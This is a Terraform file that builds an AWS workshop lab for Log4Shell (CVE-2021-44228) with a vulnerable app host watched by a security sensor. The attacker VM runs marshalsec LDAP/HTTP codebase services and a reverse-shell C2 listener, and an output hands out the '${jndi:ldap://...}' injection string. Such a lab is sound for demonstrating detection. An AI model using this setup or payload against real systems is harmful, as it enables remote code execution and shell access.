terraform {
  required_version = ">= 1.5.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

variable "aws_profile" {
  type        = string
  default     = "surfshop"
  description = "AWS CLI/SDK profile — always Surfshop (305241527903), never the personal Perkins account."
}

provider "aws" {
  region  = var.aws_region
  profile = var.aws_profile
}

variable "aws_region" {
  type    = string
  default = "us-east-1"
}

variable "name_prefix" {
  type    = string
  default = "traditionaljay"
}

variable "instance_type" {
  type    = string
  default = "t3.large"
  description = "t3.large (8 GiB RAM) — Upwind scanner-v2 needs ~7 GiB free memory at install."
}

variable "root_volume_gb" {
  type        = number
  default     = 40
  description = "Root EBS size (GiB). Default 40 — scanner-v2 needs ~7 GB free at install."
}

variable "ssh_ingress_cidr" {
  type        = string
  default     = "0.0.0.0/0"
  description = "CIDR allowed to SSH (22). Tighten for real workshops."
}

variable "app_ingress_cidr" {
  type    = string
  default = "0.0.0.0/0"
}

variable "repo_url" {
  type    = string
  default = "https://github.com/AstralJays/TraditionalJay.git"
}

variable "repo_ref" {
  type    = string
  default = "main"
}

variable "upwind_client_id" {
  type        = string
  default     = ""
  sensitive   = true
  description = "Upwind API client ID — when set, cloud-init installs the host sensor."
}

variable "upwind_client_secret" {
  type        = string
  default     = ""
  sensitive   = true
  description = "Upwind API client secret."
}

variable "upwind_agent_extra_config" {
  type    = string
  default = "scanner-v2=true"
}

data "aws_ami" "ubuntu" {
  most_recent = true
  owners      = ["099720109477"]
  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*"]
  }
}

resource "aws_security_group" "app" {
  name_prefix = "${var.name_prefix}-"
  description = "TraditionalJay HTTP + SSH"

  ingress {
    description = "SSH"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.ssh_ingress_cidr]
  }

  ingress {
    description = "App"
    from_port   = 8080
    to_port     = 8080
    protocol    = "tcp"
    cidr_blocks = [var.app_ingress_cidr]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "${var.name_prefix}-sg" }
}

locals {
  user_data = <<-EOF
    #!/bin/bash
    set -euxo pipefail
    export REPO_URL='${var.repo_url}'
    export REPO_REF='${var.repo_ref}'
    export UPWIND_CLIENT_ID='${var.upwind_client_id}'
    export UPWIND_CLIENT_SECRET='${var.upwind_client_secret}'
    export UPWIND_AGENT_EXTRA_CONFIG='${var.upwind_agent_extra_config}'

    apt-get update -y && apt-get install -y git curl ca-certificates
    git clone --depth 1 --branch "${var.repo_ref}" "${var.repo_url}" /tmp/tj
    chmod +x /tmp/tj/scripts/install-vm.sh /tmp/tj/scripts/install-upwind-sensor.sh
    # Install Upwind sensor first while the root volume is mostly empty (~7 GB required).
    /tmp/tj/scripts/install-upwind-sensor.sh
    /tmp/tj/scripts/install-vm.sh
  EOF
}

resource "aws_instance" "app" {
  ami                    = data.aws_ami.ubuntu.id
  instance_type          = var.instance_type
  vpc_security_group_ids = [aws_security_group.app.id]
  user_data              = local.user_data
  user_data_replace_on_change = true

  root_block_device {
    volume_size           = var.root_volume_gb
    volume_type           = "gp3"
    delete_on_termination = true
  }

  tags = {
    Name    = var.name_prefix
    Project = "TraditionalJay"
    CVE     = "CVE-2021-44228"
  }
}

# --- Attacker box (LDAP / HTTP codebase / C2) — not sensor'd -----------------

variable "attacker_instance_type" {
  type        = string
  default     = "t3.micro"
  description = "Small VM for Log4Shell LDAP + reverse-shell C2 listeners."
}

resource "tls_private_key" "attacker" {
  algorithm = "RSA"
  rsa_bits  = 2048
}

resource "aws_key_pair" "attacker" {
  key_name_prefix = "${var.name_prefix}-attacker-"
  public_key      = tls_private_key.attacker.public_key_openssh
}

resource "local_file" "attacker_pem" {
  content         = tls_private_key.attacker.private_key_pem
  filename        = "${path.module}/attacker.pem"
  file_permission = "0600"
}

resource "aws_security_group" "attacker" {
  name_prefix = "${var.name_prefix}-attacker-"
  description = "TraditionalJay workshop attacker (LDAP/HTTP/C2)"

  ingress {
    description = "SSH"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.ssh_ingress_cidr]
  }

  ingress {
    description = "Log4Shell LDAP"
    from_port   = 1389
    to_port     = 1389
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    description = "Log4Shell HTTP codebase"
    from_port   = 8000
    to_port     = 8000
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    description = "Reverse-shell C2"
    from_port   = 4444
    to_port     = 4444
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "${var.name_prefix}-attacker-sg" }
}

locals {
  attacker_user_data = <<-EOF
    #!/bin/bash
    set -euxo pipefail
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -y
    apt-get install -y git curl ca-certificates openjdk-11-jdk python3

    git clone --depth 1 --branch "${var.repo_ref}" "${var.repo_url}" /opt/traditionaljay-attacker
    cd /opt/traditionaljay-attacker
    chmod +x tools/*.sh tools/*.py
    ./tools/setup-marshalsec.sh
    javac -d tools/exploit tools/exploit/Exploit.java

    cat >/usr/local/bin/tj-log4shell-attacker <<'SCRIPT'
    #!/bin/bash
    set -euo pipefail
    PUB_IP="$(curl -fsSL http://169.254.169.254/latest/meta-data/public-ipv4)"
    exec /opt/traditionaljay-attacker/tools/run-log4shell-ldap.sh --codebase-host "$PUB_IP"
    SCRIPT
    chmod +x /usr/local/bin/tj-log4shell-attacker

    cat >/etc/systemd/system/tj-log4shell-attacker.service <<'UNIT'
    [Unit]
    Description=TraditionalJay attacker Log4Shell LDAP+HTTP
    After=network-online.target
    Wants=network-online.target

    [Service]
    Type=simple
    WorkingDirectory=/opt/traditionaljay-attacker
    ExecStart=/usr/local/bin/tj-log4shell-attacker
    Restart=on-failure
    RestartSec=3

    [Install]
    WantedBy=multi-user.target
    UNIT

    cat >/etc/systemd/system/tj-c2-attacker.service <<'UNIT'
    [Unit]
    Description=TraditionalJay attacker C2 banner listener
    After=network-online.target
    Wants=network-online.target

    [Service]
    Type=simple
    WorkingDirectory=/opt/traditionaljay-attacker
    ExecStart=/usr/bin/python3 /opt/traditionaljay-attacker/tools/c2-listen.py --host 0.0.0.0 --port 4444
    Restart=on-failure
    RestartSec=3

    [Install]
    WantedBy=multi-user.target
    UNIT

    systemctl daemon-reload
    systemctl enable --now tj-log4shell-attacker.service tj-c2-attacker.service
  EOF
}

resource "aws_instance" "attacker" {
  ami                         = data.aws_ami.ubuntu.id
  instance_type               = var.attacker_instance_type
  key_name                    = aws_key_pair.attacker.key_name
  vpc_security_group_ids      = [aws_security_group.attacker.id]
  user_data                   = local.attacker_user_data
  user_data_replace_on_change = true
  associate_public_ip_address = true

  root_block_device {
    volume_size           = 8
    volume_type           = "gp3"
    delete_on_termination = true
  }

  tags = {
    Name    = "${var.name_prefix}-attacker"
    Project = "TraditionalJay"
    Role    = "attacker"
  }
}

output "public_ip" {
  value = aws_instance.app.public_ip
}

output "application_url" {
  value = "http://${aws_instance.app.public_ip}:8080"
}

output "security_url" {
  value = "http://${aws_instance.app.public_ip}:8080/security"
}

output "upwind_sensor_bootstrap" {
  value = nonsensitive(var.upwind_client_id) != "" ? "enabled (host sensor via cloud-init)" : "disabled (set upwind_client_id/secret)"
}

output "attacker_public_ip" {
  value = aws_instance.attacker.public_ip
}

output "attacker_ssh" {
  value = "ssh -i infrastructure/aws/attacker.pem ubuntu@${aws_instance.attacker.public_ip}"
}

output "attacker_ldap_callback" {
  value       = "${aws_instance.attacker.public_ip}:1389"
  description = "Paste into /security LDAP field or search: $${jndi:ldap://IP:1389/a}"
}

output "attacker_c2_callback" {
  value = "${aws_instance.attacker.public_ip}:4444"
}
